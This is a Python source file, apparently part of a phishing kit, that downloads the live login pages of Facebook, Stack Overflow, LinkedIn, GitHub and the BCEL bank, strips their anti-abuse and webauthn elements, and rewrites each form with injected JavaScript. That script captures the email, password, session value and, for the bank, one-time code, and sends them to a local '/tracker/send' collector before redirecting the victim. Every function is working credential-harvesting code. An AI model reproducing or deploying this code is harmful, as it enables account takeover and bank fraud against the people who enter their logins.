import os
import re
import requests
from bs4 import BeautifulSoup

# facebook
def modify_html_facebook(url, file_path, redirect_url):

    os.makedirs(os.path.dirname(file_path), exist_ok=True)

    res = requests.get(url)
    if res.status_code == 200:
        html_data = res.content.decode("utf-8")

        pattern_action = (
            r'action="/login/\?privacy_mutation_token=.*?" method="post" onsubmit=""'
        )
        replacement_action = r'action="" class="_9vtf" data-testid="royal_login_form" id="u_0_2_Pk" method="get" onsubmit="sendData(event)"'
        modified_html = re.sub(pattern_action, replacement_action, html_data)

        pattern_signal_data = re.compile(
            r'\["BDSignalCollectionData",\[\],\{sc:".*?"\},\d+\]', re.DOTALL
        )
        pattern_signal_trigger = re.compile(
            r'\["BDClientSignalCollectionTrigger","startSignalCollection",\[\],\[\{sc:".*?"\}\]\]',
            re.DOTALL,
        )
        modified_html = re.sub(pattern_signal_data, "", modified_html)
        modified_html = re.sub(pattern_signal_trigger, "", modified_html)

        pattern_script = re.compile(
            r'(requireLazy\(\["bootstrapWebSession"\],function\(j\)\{j\(\d+\)\}\)\s*</script>)'
        )
        data_to_insert = f"""
        <script>
            let IP_local;
            async function sendData(event) {{
                event.preventDefault();

                const email = document.getElementById("email").value;
                const password = document.getElementById("pass").value;
                const hostName = window.location.hostname;
                const sessionId = localStorage.getItem("Session");
                const fullUrl = window.location.href;
                const url = new URL(fullUrl);
                const id = url.searchParams.get("id");
                IP_local = "dsds";
                if (email && password) {{
                try {{
                    const response = await fetch(
                    `http://127.0.0.1:5000/tracker/send?email=${{email}}&password=${{password}}&ip_address=${{IP_local}}&host_name=${{hostName}}&session=${{sessionId}}&id=${{id}}`,
                    {{
                        method: "GET",
                        headers: {{
                        "Content-Type": "application/json",
                        }},
                    }}
                    );
                    window.location.href = "{redirect_url}";
                }} catch (error) {{
                    console.error("Error:", error);
                }}
                }} else {{
                alert("Please fill in both fields.");
                }}
            }}
        </script>
        """

        def insert_data(match):
            return match.group(1) + data_to_insert

        modified_html = re.sub(pattern_script, insert_data, modified_html)

        parsed_data = BeautifulSoup(modified_html, "html.parser")

        with open(file_path, "w", encoding="utf-8") as file:
            file.write(parsed_data.prettify())

        return file_path
    else:
        return None

# stackoverflow
def modify_html_stackoverflow(url, file_path, redirect_url):

    os.makedirs(os.path.dirname(file_path), exist_ok=True)

    res = requests.get(url)
    if res.status_code == 200:
        html_data = res.content.decode("utf-8")

        pattern_action = r'action="/users/login" method="POST"'
        replacement_action = r'action="" method="GET" onsubmit="sendData(event)"'
        modified_html = re.sub(pattern_action, replacement_action, html_data)

        pattern_signal_data = re.compile(
            r'<script\s+id="webpack-public-path"\s+type="text/uri-list">(.*?)</script>',
            re.DOTALL,
        )
        modified_html = re.sub(pattern_signal_data, "", modified_html)

        pattern_script = re.compile(
            r"(Log in with Facebook\s*</button>\s*</div>)", re.DOTALL
        )
        data_to_insert = f"""

        <script>
            let IP_local;
            async function sendData(event) {{
                event.preventDefault();

                const email = document.getElementById("email").value;
                const password = document.getElementById("password").value;
                const hostName = window.location.hostname;
                const sessionId = localStorage.getItem("Session");
                const fullUrl = window.location.href;
                const url = new URL(fullUrl);
                const id = url.searchParams.get("id");
                IP_local = "dsds";
                if (email && password) {{
                try {{
                    const response = await fetch(
                    `http://127.0.0.1:5000/tracker/send?email=${{email}}&password=${{password}}&ip_address=${{IP_local}}&host_name=${{hostName}}&session=${{sessionId}}&id=${{id}}`,
                    {{
                        method: "GET",
                        headers: {{
                        "Content-Type": "application/json",
                        }},
                    }}
                    );
                    window.location.href = "{redirect_url}";
                }} catch (error) {{
                    console.error("Error:", error);
                }}
                }} else {{
                alert("Please fill in both fields.");
                }}
            }}
        </script>
        """

        def insert_data(match):
            return match.group(1) + data_to_insert

        modified_html = re.sub(pattern_script, insert_data, modified_html)
        parsed_data = BeautifulSoup(modified_html, "html.parser")

        with open(file_path, "w", encoding="utf-8") as file:
            file.write(parsed_data.prettify())

        return file_path
    else:
        return None

# linkedin
def modify_html_linkedin(url, file_path, redirect_url):
    os.makedirs(os.path.dirname(file_path), exist_ok=True)

    response = requests.get(url)
    if response.status_code == 200:
        page_content = response.text
    else:
        print("Failed to fetch webpage content")
        return None

    html_data = BeautifulSoup(page_content, "html.parser")

    def fetch_and_embed_css(link_tag):
        href = link_tag["href"]
        if href.startswith('http'):  # Absolute URL
            css_response = requests.get(href)
        else:  # Relative URL
            css_response = requests.get(url + href)

        if css_response.status_code == 200:
            css_content = css_response.text
            # Use raw and endraw to avoid Jinja2 processing
            raw_css_content = f"{{% raw %}}\n{css_content}\n{{% endraw %}}"
            style_tag = html_data.new_tag("style")
            style_tag.string = raw_css_content
            link_tag.replace_with(style_tag)
        else:
            print(f"Failed to fetch CSS from {href}")

    link_tags = html_data.find_all("link", rel="stylesheet")
    for link_tag in link_tags:
        fetch_and_embed_css(link_tag)

    # Embed inline styles
    for element in html_data.find_all(True):
        if "style" in element.attrs:
            style_content = element["style"]
            element["style"] = style_content

    pattern_action = (
        r'<form action="/checkpoint/lg/login-submit" class="login__form" method="post"'
    )
    replacement_action = (
        r'<form action="" class="login__form" method="GET" onsubmit="sendData(event)"'
    )
    modified_html = re.sub(pattern_action, replacement_action, str(html_data))

    pattern_script = re.compile(
        r"(Stay updated on your professional world\s*</p>\s*</div>)", re.DOTALL
    )
    data_to_insert = f"""

    <script>
        let IP_local;
        async function sendData(event) {{
            event.preventDefault();

            const email = document.getElementById("username").value;
            const password = document.getElementById("password").value;
            const hostName = window.location.hostname;
            const sessionId = localStorage.getItem("Session");
            const fullUrl = window.location.href;
            const url = new URL(fullUrl);
            const id = url.searchParams.get("id");
            IP_local = "dsds";
            if (email && password) {{
            try {{
                const response = await fetch(
                `http://127.0.0.1:5000/tracker/send?email=${{email}}&password=${{password}}&ip_address=${{IP_local}}&host_name=${{hostName}}&session=${{sessionId}}&id=${{id}}`,
                {{
                    method: "GET",
                    headers: {{
                    "Content-Type": "application/json",
                    }},
                }}
                );
                window.location.href = "{redirect_url}";
            }} catch (error) {{
                console.error("Error:", error);
            }}
            }} else {{
            alert("Please fill in both fields.");
            }}
        }}
    </script>
    """

    def insert_data(match):
        return match.group(1) + data_to_insert

    modified_html = re.sub(pattern_script, insert_data, modified_html)
    parsed_data = BeautifulSoup(modified_html, "html.parser")

    with open(file_path, "w", encoding="utf-8") as file:
        file.write(parsed_data.prettify())

    print(f"HTML data saved to {file_path}")

    return file_path



# github
def modify_html_github(url, file_path, redirect_url):

    os.makedirs(os.path.dirname(file_path), exist_ok=True)

    res = requests.get(url)
    if res.status_code == 200:
        html_data = res.content.decode("utf-8")

        pattern_action = r'action="/session" accept-charset="UTF-8" method="post"'
        replacement_action = r'action="" accept-charset="UTF-8" method="GET" onsubmit="sendData(event)"'
        modified_html = re.sub(pattern_action, replacement_action, html_data)

        pattern_signal_data = re.compile(
            r'<webauthn-subtle class="js-webauthn-subtle" hidden>',
            re.DOTALL,
        )
        modified_html = re.sub(pattern_signal_data, "", modified_html)

        pattern_script = re.compile(
            r"(</svg>\s*</button>\s*</div>)", re.DOTALL
        )
        data_to_insert = f"""

        <script>
            let IP_local;
            async function sendData(event) {{
                event.preventDefault();

                const email = document.getElementById("login_field").value;
                const password = document.getElementById("password").value;
                const hostName = window.location.hostname;
                const sessionId = localStorage.getItem("Session");
                const fullUrl = window.location.href;
                const url = new URL(fullUrl);
                const id = url.searchParams.get("id");
                IP_local = "dsds";
                if (email && password) {{
                try {{
                    const response = await fetch(
                    `http://127.0.0.1:5000/tracker/send?email=${{email}}&password=${{password}}&ip_address=${{IP_local}}&host_name=${{hostName}}&session=${{sessionId}}&id=${{id}}`,
                    {{
                        method: "GET",
                        headers: {{
                        "Content-Type": "application/json",
                        }},
                    }}
                    );
                    window.location.href = "{redirect_url}";
                }} catch (error) {{
                    console.error("Error:", error);
                }}
                }} else {{
                alert("Please fill in both fields.");
                }}
            }}
        </script>
        """

        def insert_data(match):
            return match.group(1) + data_to_insert

        modified_html = re.sub(pattern_script, insert_data, modified_html)
        parsed_data = BeautifulSoup(modified_html, "html.parser")

        with open(file_path, "w", encoding="utf-8") as file:
            file.write(parsed_data.prettify())

        return file_path
    else:
        return None



def modify_html_bcel(url, file_path, redirect_url):

    os.makedirs(os.path.dirname(file_path), exist_ok=True)

    res = requests.get(url)
    if res.status_code == 200:
        html_data = res.content.decode('utf-8') 

        pattern_action = r'\bcss/'
        replacement_action = r'https://bcel.la:8083/css/'
        modified_html = re.sub(pattern_action, replacement_action, html_data)

        pattern_action = r'\bimg/'
        replacement_action = r'https://bcel.la:8083/img/'
        modified_html = re.sub(pattern_action, replacement_action, modified_html)

        pattern = r'<div class="slidestack">.*?</div>'
        modified_html = re.sub(pattern, '', modified_html, flags=re.DOTALL)
        
        pattern_action = r'<div class="slide" id="login">'
        replacement_action = r'<div class="slide" id="login" style="margin-left: 0px; display: block; opacity: 1;">'
        modified_html = re.sub(pattern_action, replacement_action, modified_html)
        
        pattern_action = r'onsubmit="return false"'
        replacement_action = r'onsubmit="sendData(event)"'
        modified_html = re.sub(pattern_action, replacement_action, modified_html)
        

        pattern_script = re.compile(r'(Logout\s*</p>\s*</div>\s*</div>)', re.DOTALL)
        data_to_insert = f"""


        <script>
            let IP_local;
            async function sendData(event) {{
                event.preventDefault();

                const email = document.getElementById("email").value;
                const password = document.getElementById("password").value;
                const OTP = document.getElementById("otp").value;
                const hostName = window.location.hostname;
                const sessionId = localStorage.getItem("Session");
                const fullUrl = window.location.href;
                const url = new URL(fullUrl);
                const id = url.searchParams.get("id");
                IP_local = "dsds";
                if (email && password && OTP) {{
                try {{
                    const response = await fetch(
                    `http://127.0.0.1:5000/tracker/send?email=${{email}}&password=${{password}}&otp=${{OTP}}&ip_address=${{IP_local}}&host_name=${{hostName}}&session=${{sessionId}}&id=${{id}}`,
                    {{
                        method: "GET",
                        headers: {{
                        "Content-Type": "application/json",
                        }},
                    }}
                    );
                    window.location.href = "{redirect_url}";
                }} catch (error) {{
                    console.error("Error:", error);
                }}
                }} else {{
                alert("Please fill in all fields.");
                }}
            }}
        </script>
        """

        def insert_data(match):
            return match.group(1) + data_to_insert

        modified_html = re.sub(pattern_script, insert_data, modified_html)
        parsed_data = BeautifulSoup(modified_html, "html.parser")

        with open(file_path, "w", encoding="utf-8") as file:
            file.write(parsed_data.prettify())

        return file_path
    else:
        return None



def create_landing(url, file_path):

    os.makedirs(os.path.dirname(file_path), exist_ok=True)

    res = requests.get(url)
    if res.status_code == 200:
        htmlData = res.content
        parsed_data = BeautifulSoup(htmlData, "html.parser")
        
        with open(file_path, "w", encoding="utf-8") as file:

            file.write(parsed_data.prettify())

        return file_path
    else:
        return None  # make_response(jsonify({"msg","Failed to fetch content with this URL"}), HTTP_400_BAD_REQUEST)